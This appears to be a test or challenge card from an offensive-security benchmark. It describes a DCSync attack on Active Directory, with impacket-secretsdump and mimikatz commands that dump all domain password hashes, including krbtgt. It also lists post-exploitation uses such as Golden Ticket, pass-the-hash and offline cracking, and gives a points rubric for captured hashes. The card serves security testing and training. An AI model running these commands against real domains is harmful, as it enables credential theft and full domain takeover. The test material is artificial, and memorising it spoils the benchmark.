# FOX-AD-002: DCSync Attack

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-AD-002 |
| **Domain** | Active Directory |
| **MITRE** | T1003.006 (OS Credential Dumping: DCSync) |
| **Difficulty** | Hard |
| **Prerequisites** | Domain Admin or equivalent (Replicating Directory Changes rights) |

## Methodology
1. **Check privileges**: Must have `Replicating Directory Changes`, `Replicating Directory Changes All`, `Replicating Directory Changes In Filtered Set`
2. **Impacket secretsdump**:
   ```bash
   impacket-secretsdump -just-dc <domain>/<admin>:<password>@<DC-IP>
   # Full dump:
   impacket-secretsdump <domain>/<admin>:<password>@<DC-IP>
   # User of interest only:
   impacket-secretsdump -just-dc-user <target_user> <domain>/<admin>:<password>@<DC-IP>
   ```
3. **Mimikatz** (On DC):
   ```cmd
   mimikatz "lsadump::dcsync /domain:<domain> /user:krbtgt" exit
   mimikatz "lsadump::dcsync /domain:<domain> /all" exit
   ```
4. **Output**: Captures NTLM hashes for ALL domain users, Kerberos keys, and machine accounts
5. **Post-exploitation**:
   - Extract krbtgt hash → Golden Ticket
   - Extract domain admin hash → Pass-the-hash to any system
   - Extract all user hashes → crack offline

## Keywords
`active-directory-kerberos-attacks`, `DCSync`, `secretsdump`, `mimikatz lsadump::dcsync`, `NTDS.dit`, `Replicating Directory Changes`, `krbtgt hash`, `domain dominance`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| DCSync rights confirmed | 20 |
| DCSync executed (Impacket or Mimikatz) | 30 |
| Hashes extracted (min 5 users) | 20 |
| krbtgt hash captured | 15 |
| Domain admin hash captured | 15 |
| **Total** | **100** |
